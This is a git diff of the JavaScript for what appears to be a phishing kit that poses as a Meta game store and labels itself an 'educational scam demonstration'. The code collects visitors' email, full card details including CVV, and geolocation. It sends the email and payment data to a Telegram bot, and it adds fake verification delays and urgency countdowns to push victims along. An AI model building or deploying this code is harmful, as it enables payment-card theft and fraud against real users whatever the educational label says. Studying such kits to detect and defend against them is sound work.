 ⚠️ User completed Step 1 - Email collection phase
 🔍 Next: Will proceed to payment form if they continue
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚠️ EDUCATIONAL SCAM DEMONSTRATION ⚠️
 This shows how much data scammers collect instantly
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
     
     const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
@@ -1017,7 +1166,9 @@ This shows how much data scammers collect instantly
     }
 }
 
-// UPDATED: Send complete payment data to Telegram with simplified info (Step 2)
+// ====================================================================
+// TELEGRAM INTEGRATION - SEND COMPLETE PAYMENT DATA (STEP 2)
+// ====================================================================
 async function sendFullPaymentToTelegram(paymentData) {
     const locationInfo = formatLocationData(userLocationData);
     
@@ -1048,11 +1199,11 @@ ${locationInfo}
 
 ✅ 2-STEP PROCESS COMPLETED SUCCESSFULLY!
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚠️ EDUCATIONAL SCAM DEMONSTRATION ⚠️
 Complete victim profile created with:
 • Personal details • Financial data • Location data
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
     
     const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
@@ -1078,9 +1229,462 @@ Complete victim profile created with:
     }
 }
 
-// UPDATED VERSION - Part 4: Modal System and Form Handling (ENHANCED VALIDATION WITH COUNTRY-SPECIFIC ZIP CODES)
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 3 LOADED: Geolocation & Countries System');
+console.log('🌍 Loaded: IP geolocation fetching with comprehensive tracking');
+console.log('🌎 Loaded: World countries loading with API fallback');
+console.log('🎯 Loaded: Auto-country selection based on location');
+console.log('📊 Loaded: Telegram integration for data collection demo');
+console.log('✅ PART 3 COMPLETE - Ready for Part 4: Zip Code Validation System');
 
-// STEP 1: Show Email Modal
+// ====================================================================
+// SCRIPT.JS - PART 4: ZIP CODE VALIDATION SYSTEM
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: Country-specific zip code validation, formatting, and management
+// ====================================================================
+
+// ====================================================================
+// ZIP CODE PATTERN RETRIEVAL
+// ====================================================================
+function getZipCodePattern(countryCode) {
+    return ZIP_CODE_PATTERNS[countryCode] || ZIP_CODE_PATTERNS['DEFAULT'];
+}
+
+// ====================================================================
+// COUNTRY-SPECIFIC ZIP CODE VALIDATION
+// ====================================================================
+function validateZipCodeByCountry(zipCode, countryCode) {
+    if (!zipCode || !countryCode) return false;
+    
+    const pattern = getZipCodePattern(countryCode);
+    const cleanZip = zipCode.trim();
+    
+    console.log(`🔍 Validating zip "${cleanZip}" for country "${countryCode}" with pattern:`, pattern.pattern);
+    
+    const isValid = pattern.pattern.test(cleanZip);
+    console.log(`${isValid ? '✅' : '❌'} Zip validation result: ${isValid}`);
+    
+    return isValid;
+}
+
+// ====================================================================
+// LEGACY ZIP CODE VALIDATION (BACKWARD COMPATIBILITY)
+// ====================================================================
+function validateZipCode(zipCode, country) {
+    console.log('📮 Legacy validateZipCode called with:', zipCode, country);
+    
+    // Use new country-specific validation if country is provided
+    if (country && country !== '') {
+        const isValid = validateZipCodeByCountry(zipCode, country);
+        console.log(`📮 Using country-specific validation for ${country}: ${isValid ? '✅' : '❌'}`);
+        return isValid;
+    }
+    
+    // Fallback to legacy patterns for backward compatibility
+    console.log('📮 Using legacy fallback validation patterns');
+    
+    const legacyZipPatterns = {
+        'US': /^\d{5}(-\d{4})?$/,
+        'CA': /^[A-Za-z]\d[A-Za-z] \d[A-Za-z]\d$/,
+        'GB': /^[A-Z]{1,2}\d[A-Z\d]? \d[A-Z]{2}$/,
+        'DE': /^\d{5}$/,
+        'FR': /^\d{5}$/,
+        'default': /^.{3,10}$/
+    };
+    
+    const pattern = legacyZipPatterns[country] || legacyZipPatterns['default'];
+    const isValid = pattern.test(zipCode);
+    
+    console.log(`📮 Legacy validation result: ${isValid ? '✅' : '❌'}`);
+    return isValid;
+}
+
+// ====================================================================
+// ZIP CODE PLACEHOLDER AND LABEL UPDATES
+// ====================================================================
+function updateZipCodePlaceholder(countryCode) {
+    const zipInput = document.getElementById('zipCode');
+    const zipLabel = document.querySelector('label[for="zipCode"]');
+    
+    if (!zipInput) return;
+    
+    const pattern = getZipCodePattern(countryCode);
+    
+    // Update placeholder
+    zipInput.placeholder = pattern.placeholder;
+    
+    // Update label with format example
+    if (zipLabel) {
+        zipLabel.innerHTML = `Zip Code * <small style="color: #666; font-weight: normal;">(${pattern.example})</small>`;
+    }
+    
+    // Clear previous validation state when country changes
+    zipInput.classList.remove('error');
+    clearFieldError('zipCode');
+    
+    // Reset validation state
+    if (typeof formValidationState !== 'undefined') {
+        formValidationState.zipCode = false;
+        if (typeof updateSubmitButtonState === 'function') {
+            updateSubmitButtonState();
+        }
+    }
+    
+    console.log(`📋 Updated zip code format for ${countryCode}:`, pattern.example);
+}
+
+// ====================================================================
+// REAL-TIME ZIP CODE FORMATTING
+// ====================================================================
+function formatZipCodeInput(zipCode, countryCode) {
+    if (!zipCode || !countryCode) return zipCode;
+    
+    const cleanZip = zipCode.replace(/[^\w\s]/g, '').toUpperCase();
+    
+    switch (countryCode) {
+        case 'CA':
+            // Format: L1L 1L1
+            if (cleanZip.length <= 6) {
+                return cleanZip.replace(/^([A-Z]\d[A-Z])(\d[A-Z]\d)$/, '$1 $2');
+            }
+            break;
+            
+        case 'GB':
+            // Format: SW1A 1AA
+            if (cleanZip.length > 3 && cleanZip.length <= 7) {
+                const match = cleanZip.match(/^([A-Z]{1,2}\d[A-Z\d]?)(\d[A-Z]{2})$/);
+                if (match) {
+                    return `${match[1]} ${match[2]}`;
+                }
+            }
+            break;
+            
+        case 'NL':
+            // Format: 1234 AB
+            if (cleanZip.length > 4) {
+                return cleanZip.replace(/^(\d{4})([A-Z]{2})$/, '$1 $2');
+            }
+            break;
+            
+        case 'SE':
+        case 'CZ':
+        case 'SK':
+            // Format: 123 45
+            if (cleanZip.length > 3) {
+                return cleanZip.replace(/^(\d{3})(\d{2})$/, '$1 $2');
+            }
+            break;
+            
+        case 'PL':
+            // Format: 12-345
+            if (cleanZip.length > 2) {
+                return cleanZip.replace(/^(\d{2})(\d{3})$/, '$1-$2');
+            }
+            break;
+            
+        case 'JP':
+            // Format: 123-4567
+            if (cleanZip.length > 3) {
+                return cleanZip.replace(/^(\d{3})(\d{4})$/, '$1-$2');
+            }
+            break;
+            
+        case 'BR':
+            // Format: 12345-678
+            if (cleanZip.length > 5) {
+                return cleanZip.replace(/^(\d{5})(\d{3})$/, '$1-$2');
+            }
+            break;
+    }
+    
+    return cleanZip;
+}
+
+// ====================================================================
+// ZIP CODE ERROR MESSAGE GENERATION
+// ====================================================================
+function getZipCodeErrorMessage(countryCode) {
+    const pattern = getZipCodePattern(countryCode);
+    return `Please enter a valid zip code (${pattern.example})`;
+}
+
+// ====================================================================
+// FORM VALIDATION HELPERS
+// ====================================================================
+
+// Show field error message
+function showFieldError(fieldId, message) {
+    const field = document.getElementById(fieldId);
+    const errorElement = document.getElementById(fieldId + 'Error');
+    
+    if (field) field.classList.add('error');
+    if (errorElement) {
+        errorElement.textContent = message;
+        errorElement.classList.add('show');
+    }
+}
+
+// Clear field error message
+function clearFieldError(fieldId) {
+    const field = document.getElementById(fieldId);
+    const errorElement = document.getElementById(fieldId + 'Error');
+    
+    if (field) field.classList.remove('error');
+    if (errorElement) {
+        errorElement.classList.remove('show');
+    }
+}
+
+// Update submit button state based on validation
+function updateSubmitButtonState() {
+    const submitButton = document.getElementById('submitPayment');
+    if (!submitButton) return; // Safety check
+    
+    const allValid = Object.values(formValidationState).every(valid => valid);
+    
+    if (allValid) {
+        submitButton.disabled = false;
+        submitButton.style.opacity = '1';
+        submitButton.style.cursor = 'pointer';
+        submitButton.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
+        console.log('✅ Submit button enabled - all fields valid');
+    } else {
+        submitButton.disabled = true;
+        submitButton.style.opacity = '0.6';
+        submitButton.style.cursor = 'not-allowed';
+        submitButton.style.background = '#95a5a6';
+        console.log('⚠️ Submit button disabled - validation state:', formValidationState);
+    }
+}
+
+// Get field-specific error messages
+function getFieldErrorMessage(field) {
+    const messages = {
+        cardHolder: 'Please enter card holder full name',
+        cardNumber: 'Please enter a valid card number',
+        cardExpiry: 'Please enter valid expiry date (MM/YY)',
+        cardCvv: 'Please enter valid CVV code',
+        country: 'Please select your country',
+        zipCode: 'Please enter valid zip code'
+    };
+    
+    return messages[field] || 'This field is required';
+}
+
+// ====================================================================
+// EMAIL VALIDATION
+// ====================================================================
+function validateEmail(email) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+}
+
+// ====================================================================
+// CARD VALIDATION FUNCTIONS
+// ====================================================================
+
+// Detect card type from number
+function detectCardType(cardNumber) {
+    const cleanNumber = cardNumber.replace(/\s/g, '');
+    
+    for (const [type, config] of Object.entries(CARD_BINS)) {
+        for (const bin of config.bins) {
+            if (cleanNumber.startsWith(bin)) {
+                return type;
+            }
+        }
+    }
+    
+    return null;
+}
+
+// Update card type icon display
+function updateCardTypeIcon(cardType) {
+    const cardTypeIcon = document.getElementById('cardTypeIcon');
+    
+    if (!cardTypeIcon) return;
+    
+    cardTypeIcon.className = 'card-type-icon';
+    if (cardType) {
+        cardTypeIcon.classList.add(cardType);
+    }
+}
+
+// Validate card number using Luhn algorithm and BIN ranges
+function validateCardNumber(cardNumber, cardType) {
+    const cleanNumber = cardNumber.replace(/\s/g, '');
+    
+    if (!cardType || !cleanNumber) return false;
+    
+    // Check length
+    const expectedLengths = CARD_BINS[cardType].lengths;
+    if (!expectedLengths.includes(cleanNumber.length)) return false;
+    
+    // Luhn algorithm validation
+    return luhnCheck(cleanNumber);
+}
+
+// Luhn algorithm implementation
+function luhnCheck(cardNumber) {
+    let sum = 0;
+    let alternate = false;
+    
+    for (let i = cardNumber.length - 1; i >= 0; i--) {
+        let n = parseInt(cardNumber.charAt(i), 10);
+        
+        if (alternate) {
+            n *= 2;
+            if (n > 9) {
+                n = (n % 10) + 1;
+            }
+        }
+        
+        sum += n;
+        alternate = !alternate;
+    }
+    
+    return (sum % 10) === 0;
+}
+
+// Validate card expiry date
+function validateCardExpiry(expiry) {
+    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+    
+    const [month, year] = expiry.split('/').map(n => parseInt(n, 10));
+    const currentDate = new Date();
+    const currentYear = currentDate.getFullYear() % 100;
+    const currentMonth = currentDate.getMonth() + 1;
+    
+    if (month < 1 || month > 12) return false;
+    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
+    
+    return true;
+}
+
+// Validate CVV code
+function validateCVV(cvv, cardType) {
+    const expectedLength = cardType === 'amex' ? 4 : 3;
+    return cvv.length === expectedLength && /^\d+$/.test(cvv);
+}
+
+// ====================================================================
+// COMPREHENSIVE FORM VALIDATION
+// ====================================================================
+function validateAllFields() {
+    const cardHolder = document.getElementById('cardHolder')?.value.trim() || '';
+    const cardNumber = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || '';
+    const cardExpiry = document.getElementById('cardExpiry')?.value || '';
+    const cardCvv = document.getElementById('cardCvv')?.value || '';
+    const country = document.getElementById('country')?.value || '';
+    const zipCode = document.getElementById('zipCode')?.value.trim() || '';
+    
+    // Validate each field
+    formValidationState.cardHolder = cardHolder.length >= 2;
+    formValidationState.cardNumber = validateCardNumber(cardNumber, detectCardType(cardNumber));
+    formValidationState.cardExpiry = validateCardExpiry(cardExpiry);
+    formValidationState.cardCvv = validateCVV(cardCvv, detectCardType(cardNumber));
+    formValidationState.country = country !== '';
+    
+    // ENHANCED: Country-specific zip code validation
+    formValidationState.zipCode = validateZipCodeByCountry(zipCode, country);
+    
+    console.log('📋 Full form validation check:', formValidationState);
+    console.log(`📮 Zip code "${zipCode}" for country "${country}": ${formValidationState.zipCode ? '✅ Valid' : '❌ Invalid'}`);
+    
+    return Object.values(formValidationState).every(valid => valid);
+}
+
+// ====================================================================
+// TESTING FUNCTIONS (FOR EDUCATIONAL PURPOSES)
+// ====================================================================
+
+// Test zip code validation patterns
+function testZipCodeValidation() {
+    console.log('🧪 Testing Country-Specific Zip Code Validation:');
+    
+    const testCases = [
+        { country: 'US', zip: '12345', expected: true },
+        { country: 'US', zip: '12345-6789', expected: true },
+        { country: 'US', zip: '123', expected: false },
+        { country: 'GB', zip: 'SW1A 1AA', expected: true },
+        { country: 'GB', zip: 'M1 1AA', expected: true },
+        { country: 'GB', zip: '12345', expected: false },
+        { country: 'CA', zip: 'K1A 0A6', expected: true },
+        { country: 'CA', zip: 'K1A0A6', expected: true },
+        { country: 'CA', zip: '12345', expected: false },
+        { country: 'DE', zip: '12345', expected: true },
+        { country: 'DE', zip: '123', expected: false },
+        { country: 'NL', zip: '1234 AB', expected: true },
+        { country: 'NL', zip: '1234AB', expected: true },
+        { country: 'NL', zip: '12345', expected: false },
+        { country: 'JP', zip: '123-4567', expected: true },
+        { country: 'JP', zip: '1234567', expected: true },
+        { country: 'MA', zip: '20000', expected: true },
+        { country: 'MA', zip: '123', expected: false }
+    ];
+    
+    testCases.forEach(test => {
+        const result = validateZipCodeByCountry(test.zip, test.country);
+        const status = result === test.expected ? '✅ PASS' : '❌ FAIL';
+        console.log(`${status} ${test.country}: "${test.zip}" → ${result} (expected: ${test.expected})`);
+    });
+    
+    console.log('🧪 Zip code validation testing complete');
+}
+
+// Test zip code formatting
+function testZipCodeFormatting() {
+    console.log('🎨 Testing Zip Code Auto-Formatting:');
+    
+    const formatTests = [
+        { country: 'CA', input: 'k1a0a6', expected: 'K1A 0A6' },
+        { country: 'GB', input: 'sw1a1aa', expected: 'SW1A 1AA' },
+        { country: 'NL', input: '1234ab', expected: '1234 AB' },
+        { country: 'JP', input: '1234567', expected: '123-4567' },
+        { country: 'PL', input: '12345', expected: '12-345' },
+        { country: 'SE', input: '12345', expected: '123 45' },
+        { country: 'BR', input: '12345678', expected: '12345-678' }
+    ];
+    
+    formatTests.forEach(test => {
+        const result = formatZipCodeInput(test.input, test.country);
+        const status = result === test.expected ? '✅ PASS' : '❌ FAIL';
+        console.log(`${status} ${test.country}: "${test.input}" → "${result}" (expected: "${test.expected}")`);
+    });
+    
+    console.log('🎨 Zip code formatting testing complete');
+}
+
+// Run validation tests in development
+setTimeout(() => {
+    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+        testZipCodeValidation();
+        testZipCodeFormatting();
+    }
+}, 3000);
+
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 4 LOADED: Zip Code Validation System');
+console.log('📮 Loaded: Country-specific zip code validation for 50+ countries');
+console.log('🎨 Loaded: Real-time zip code formatting and auto-correction');
+console.log('✅ Loaded: Form validation helpers and error management');
+console.log('💳 Loaded: Credit card validation (Luhn algorithm, BIN ranges)');
+console.log('🧪 Loaded: Testing functions for validation and formatting');
+console.log('✅ PART 4 COMPLETE - Ready for Part 5: Email Modal (Step 1)');
+
+// ====================================================================
+// SCRIPT.JS - PART 5: EMAIL MODAL (STEP 1)
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: Email collection modal, validation, and Step 1 processing
+// ====================================================================
+
+// ====================================================================
+// STEP 1: SHOW EMAIL MODAL
+// ====================================================================
 function showEmailModal(gameName, currentPrice, originalPrice) {
     console.log('📧 Showing email modal...');
     
@@ -1107,7 +1711,9 @@ function showEmailModal(gameName, currentPrice, originalPrice) {
     initializeEmailForm();
 }
 
-// Create Email Modal HTML (Step 1)
+// ====================================================================
+// CREATE EMAIL MODAL HTML
+// ====================================================================
 function createEmailModal() {
     const modalHTML = `
         <div class="modal-overlay" id="emailModal">
@@ -1198,7 +1804,9 @@ function createEmailModal() {
     });
 }
 
-// Initialize Email Form (Step 1)
+// ====================================================================
+// INITIALIZE EMAIL FORM VALIDATION AND SUBMISSION
+// ====================================================================
 function initializeEmailForm() {
     const form = document.getElementById('emailForm');
     const emailInput = document.getElementById('userEmail');
@@ -1269,20 +1877,313 @@ function initializeEmailForm() {
         // Store email globally
         userPaymentData.email = email;
         
+        // Show processing state
+        showEmailProcessing(submitButton);
+        
         // Send email data to Telegram immediately (Step 1 data collection)
         sendEmailToTelegram(email, userPaymentData.gameName, userPaymentData.currentPrice);
         
-        // Close email modal and show full payment modal
-        closeEmailModal();
-        
-        // Small delay for better UX
+        // Simulate email verification process
         setTimeout(() => {
-            showFullPaymentModal();
+            // Close email modal and show full payment modal
+            closeEmailModal();
+            
+            // Small delay for better UX
+            setTimeout(() => {
+                showFullPaymentModal();
+            }, 300);
+        }, 2000); // 2 seconds for realistic processing
+    });
+}
+
+// ====================================================================
+// EMAIL PROCESSING ANIMATION
+// ====================================================================
+function showEmailProcessing(submitButton) {
+    const originalText = submitButton.innerHTML;
+    
+    // Show processing state
+    submitButton.innerHTML = '<div class="spinner"></div> Verifying Email...';
+    submitButton.disabled = true;
+    submitButton.style.opacity = '0.8';
+    submitButton.style.cursor = 'not-allowed';
+    
+    // Add processing class for additional styling
+    submitButton.classList.add('processing');
+    
+    console.log('📧 Email processing started...');
+}
+
+// ====================================================================
+// CLOSE EMAIL MODAL
+// ====================================================================
+function closeEmailModal() {
+    const modal = document.getElementById('emailModal');
+    if (modal) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+        
+        // Reset form if it exists
+        const form = document.getElementById('emailForm');
+        if (form) {
+            form.reset();
+        }
+        
+        // Remove error states
+        const errorInputs = document.querySelectorAll('.error');
+        errorInputs.forEach(input => input.classList.remove('error'));
+        
+        // Reset submit button state
+        const submitButton = document.getElementById('continueToPayment');
+        if (submitButton) {
+            submitButton.disabled = true;
+            submitButton.style.opacity = '0.6';
+            submitButton.style.cursor = 'not-allowed';
+            submitButton.style.background = '#95a5a6';
+            submitButton.classList.remove('processing');
+            submitButton.innerHTML = '<i class="fas fa-arrow-right"></i> Continue to Secure Checkout';
+        }
+        
+        console.log('📧 Email modal closed and reset');
+    }
+}
+
+// ====================================================================
+// EMAIL COUNTDOWN TIMER (FOR URGENCY)
+// ====================================================================
+function initializeEmailCountdown() {
+    const countdownElement = document.getElementById('emailCountdown');
+    
+    if (!countdownElement) return;
+    
+    let days = 2;
+    let hours = 23;
+    let minutes = 47;
+    
+    function updateEmailCountdown() {
+        minutes--;
+        
+        if (minutes < 0) {
+            minutes = 59;
+            hours--;
+            
+            if (hours < 0) {
+                hours = 23;
+                days--;
+                
+                if (days < 0) {
+                    days = 2;
+                    hours = 23;
+                    minutes = 47;
+                }
+            }
+        }
+        
+        if (days > 0) {
+            countdownElement.textContent = `${days} days`;
+        } else if (hours > 0) {
+            countdownElement.textContent = `${hours} hours`;
+        } else {
+            countdownElement.textContent = `${minutes} minutes`;
+            countdownElement.style.color = '#e74c3c';
+            countdownElement.style.fontWeight = 'bold';
+        }
+    }
+    
+    // Start countdown when email modal is shown
+    const emailModal = document.getElementById('emailModal');
+    if (emailModal) {
+        const observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+                    if (emailModal.classList.contains('active')) {
+                        updateEmailCountdown();
+                        const intervalId = setInterval(updateEmailCountdown, 60000); // Update every minute
+                        
+                        // Stop countdown when modal is closed
+                        const stopObserver = new MutationObserver(function(stopMutations) {
+                            stopMutations.forEach(function(stopMutation) {
+                                if (!emailModal.classList.contains('active')) {
+                                    clearInterval(intervalId);
+                                    stopObserver.disconnect();
+                                }
+                            });
+                        });
+                        
+                        stopObserver.observe(emailModal, { attributes: true, attributeFilter: ['class'] });
+                    }
+                }
+            });
+        });
+        
+        observer.observe(emailModal, { attributes: true, attributeFilter: ['class'] });
+    }
+}
+
+// ====================================================================
+// NOTIFICATION SYSTEM FOR EMAIL STEP
+// ====================================================================
+function showNotification(message, type = 'info') {
+    const notification = document.createElement('div');
+    notification.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        padding: 1rem 1.5rem;
+        border-radius: 8px;
+        color: white;
+        font-weight: 600;
+        z-index: 1001;
+        max-width: 350px;
+        white-space: pre-line;
+        animation: slideIn 0.3s ease;
+        box-shadow: 0 6px 25px rgba(0,0,0,0.4);
+        border-left: 4px solid rgba(255,255,255,0.3);
+    `;
+    
+    const colors = {
+        'success': '#27ae60',
+        'error': '#e74c3c',
+        'info': '#0866ff',
+        'warning': '#f39c12'
+    };
+    
+    notification.style.background = colors[type] || colors['info'];
+    notification.textContent = message;
+    
+    // Add animation keyframes if not exists
+    if (!document.querySelector('#notification-styles')) {
+        const style = document.createElement('style');
+        style.id = 'notification-styles';
+        style.textContent = `
+            @keyframes slideIn {
+                from { transform: translateX(100%); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            @keyframes slideOut {
+                from { transform: translateX(0); opacity: 1; }
+                to { transform: translateX(100%); opacity: 0; }
+            }
+        `;
+        document.head.appendChild(style);
+    }
+    
+    document.body.appendChild(notification);
+    
+    // Auto remove after 5 seconds
+    setTimeout(() => {
+        notification.style.animation = 'slideOut 0.3s ease';
+        setTimeout(() => {
+            if (document.body.contains(notification)) {
+                document.body.removeChild(notification);
+            }
+        }, 300);
+    }, 5000);
+    
+    // Click to dismiss
+    notification.addEventListener('click', function() {
+        this.style.animation = 'slideOut 0.3s ease';
+        setTimeout(() => {
+            if (document.body.contains(this)) {
+                document.body.removeChild(this);
+            }
         }, 300);
     });
 }
 
-// STEP 2: Show Full Payment Modal
+// ====================================================================
+// EMAIL STEP ANALYTICS (EDUCATIONAL DEMO)
+// ====================================================================
+function trackEmailStep(email) {
+    const emailStepData = {
+        step: 'Email Collection',
+        email: email,
+        timestamp: new Date().toISOString(),
+        timeOnPage: performance.now(),
+        userAgent: navigator.userAgent,
+        locationData: userLocationData,
+        gameData: {
+            name: userPaymentData.gameName,
+            price: userPaymentData.currentPrice,
+            originalPrice: userPaymentData.originalPrice
+        }
+    };
+    
+    console.log('📊 Email Step Analytics (Educational Demo):', emailStepData);
+    
+    // This demonstrates how scammers track user behavior at each step
+    return emailStepData;
+}
+
+// ====================================================================
+// EMAIL VALIDATION ENHANCEMENT
+// ====================================================================
+function enhancedEmailValidation(email) {
+    // Basic email validation
+    if (!validateEmail(email)) {
+        return { valid: false, reason: 'Invalid email format' };
+    }
+    
+    // Additional checks that scammers might use
+    const commonDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com'];
+    const domain = email.split('@')[1];
+    
+    // Check for suspicious patterns (educational purposes)
+    if (email.includes('test') || email.includes('fake') || email.includes('example')) {
+        console.log('⚠️ Potentially test email detected:', email);
+    }
+    
+    if (commonDomains.includes(domain)) {
+        console.log('✅ Common email domain detected:', domain);
+    } else {
+        console.log('🔍 Custom email domain:', domain);
+    }
+    
+    return { valid: true, domain: domain, isCommon: commonDomains.includes(domain) };
+}
+
+// ====================================================================
+// EMAIL STEP SUCCESS TRACKING
+// ====================================================================
+function trackEmailSuccess() {
+    console.log('🎯 EMAIL STEP COMPLETED SUCCESSFULLY');
+    console.log('📧 Email collected:', userPaymentData.email);
+    console.log('🎮 Game selected:', userPaymentData.gameName);
+    console.log('💰 Price point:', userPaymentData.currentPrice);
+    console.log('🌍 User location:', userLocationData.country_name, userLocationData.city);
+    console.log('⏰ Time to email completion:', performance.now(), 'ms');
+    console.log('🔄 Proceeding to Step 2: Payment Information');
+}
+
+// ====================================================================
+// INITIALIZE EMAIL STEP FEATURES
+// ====================================================================
+// Auto-initialize email countdown when script loads
+setTimeout(() => {
+    initializeEmailCountdown();
+}, 1000);
+
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 5 LOADED: Email Modal (Step 1)');
+console.log('📧 Loaded: Email modal creation and display system');
+console.log('✅ Loaded: Email form validation with real-time feedback');
+console.log('🎨 Loaded: Email processing animation and UX enhancements');
+console.log('⏰ Loaded: Email countdown timer for urgency');
+console.log('📊 Loaded: Email step analytics and tracking');
+console.log('🔔 Loaded: Notification system for user feedback');
+console.log('✅ PART 5 COMPLETE - Ready for Part 6: Payment Modal (Step 2)');
+
+// ====================================================================
+// SCRIPT.JS - PART 6: PAYMENT MODAL (STEP 2)
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: Payment modal creation, form validation, and realistic processing
+// ====================================================================
+
+// ====================================================================
+// STEP 2: SHOW FULL PAYMENT MODAL
+// ====================================================================
 function showFullPaymentModal() {
     // Create payment modal if it doesn't exist
     if (!document.getElementById('paymentModal')) {
@@ -1311,7 +2212,9 @@ function showFullPaymentModal() {
     initializePaymentForm();
 }
 
-// Create Payment Modal HTML (Step 2) - UPDATED WITH DYNAMIC COUNTRY DROPDOWN
+// ====================================================================
+// CREATE PAYMENT MODAL HTML (STEP 2)
+// ====================================================================
 function createPaymentModal() {
     const modalHTML = `
         <div class="modal-overlay" id="paymentModal">
@@ -1423,87 +2326,9 @@ function createPaymentModal() {
     });
 }
 
-// ENHANCED: Form Validation State Tracking
-let formValidationState = {
-    cardHolder: false,
-    cardNumber: false,
-    cardExpiry: false,
-    cardCvv: false,
-    country: false,
-    zipCode: false
-};
-
-// NEW: Update Submit Button State
-function updateSubmitButtonState() {
-    const submitButton = document.getElementById('submitPayment');
-    if (!submitButton) return; // Safety check
-    
-    const allValid = Object.values(formValidationState).every(valid => valid);
-    
-    if (allValid) {
-        submitButton.disabled = false;
-        submitButton.style.opacity = '1';
-        submitButton.style.cursor = 'pointer';
-        submitButton.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
-        console.log('✅ Submit button enabled - all fields valid');
-    } else {
-        submitButton.disabled = true;
-        submitButton.style.opacity = '0.6';
-        submitButton.style.cursor = 'not-allowed';
-        submitButton.style.background = '#95a5a6';
-        console.log('⚠️ Submit button disabled - validation state:', formValidationState);
-    }
-}
-
-// NEW: Show Field Error
-function showFieldError(fieldId, message) {
-    const field = document.getElementById(fieldId);
-    const errorElement = document.getElementById(fieldId + 'Error');
-    
-    if (field) field.classList.add('error');
-    if (errorElement) {
-        errorElement.textContent = message;
-        errorElement.classList.add('show');
-    }
-}
-
-// NEW: Clear Field Error
-function clearFieldError(fieldId) {
-    const field = document.getElementById(fieldId);
-    const errorElement = document.getElementById(fieldId + 'Error');
-    
-    if (field) field.classList.remove('error');
-    if (errorElement) {
-        errorElement.classList.remove('show');
-    }
-}
-
-// ENHANCED: Validate All Fields with Country-Specific Zip Code Validation
-function validateAllFields() {
-    const cardHolder = document.getElementById('cardHolder')?.value.trim() || '';
-    const cardNumber = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || '';
-    const cardExpiry = document.getElementById('cardExpiry')?.value || '';
-    const cardCvv = document.getElementById('cardCvv')?.value || '';
-    const country = document.getElementById('country')?.value || '';
-    const zipCode = document.getElementById('zipCode')?.value.trim() || '';
-    
-    // Validate each field
-    formValidationState.cardHolder = cardHolder.length >= 2;
-    formValidationState.cardNumber = validateCardNumber(cardNumber, detectCardType(cardNumber));
-    formValidationState.cardExpiry = validateCardExpiry(cardExpiry);
-    formValidationState.cardCvv = validateCVV(cardCvv, detectCardType(cardNumber));
-    formValidationState.country = country !== '';
-    
-    // ENHANCED: Country-specific zip code validation
-    formValidationState.zipCode = validateZipCodeByCountry(zipCode, country);
-    
-    console.log('📋 Full form validation check:', formValidationState);
-    console.log(`📮 Zip code "${zipCode}" for country "${country}": ${formValidationState.zipCode ? '✅ Valid' : '❌ Invalid'}`);
-    
-    return Object.values(formValidationState).every(valid => valid);
-}
-
-// ENHANCED: Initialize Payment Form (Step 2) with ENHANCED ZIP CODE VALIDATION
+// ====================================================================
+// INITIALIZE PAYMENT FORM (ENHANCED WITH REALISTIC PROCESSING)
+// ====================================================================
 function initializePaymentForm() {
     const form = document.getElementById('paymentForm');
     const cardNumberInput = document.getElementById('cardNumber');
@@ -1517,24 +2342,21 @@ function initializePaymentForm() {
     // Initialize submit button as disabled
     updateSubmitButtonState();
     
-    // NEW: POPULATE COUNTRY DROPDOWN WITH AUTO-SELECTION
+    // Populate country dropdown with auto-selection
     console.log('🌍 Populating country dropdown...');
     populateCountryDropdown(countrySelect);
     
-    // FIXED: Add delay to check if country was auto-selected and update button state
+    // Add delay to check if country was auto-selected and update button state
     setTimeout(() => {
         if (countrySelect && countrySelect.value !== '') {
             console.log('🔄 Country was auto-selected, updating validation state...');
             formValidationState.country = true;
-            
-            // Update zip code format for auto-selected country
             updateZipCodePlaceholder(countrySelect.value);
-            
             updateSubmitButtonState();
         }
-    }, 1000); // 1 second delay to allow auto-selection to complete
+    }, 1000);
     
-    // ENHANCED: Card Holder Validation
+    // Card Holder Validation
     if (cardHolderInput) {
         cardHolderInput.addEventListener('input', function() {
             const value = this.value.trim();
@@ -1553,7 +2375,7 @@ function initializePaymentForm() {
         });
     }
     
-    // ENHANCED: Card number formatting and validation
+    // Card number formatting and validation
     if (cardNumberInput) {
         cardNumberInput.addEventListener('input', function() {
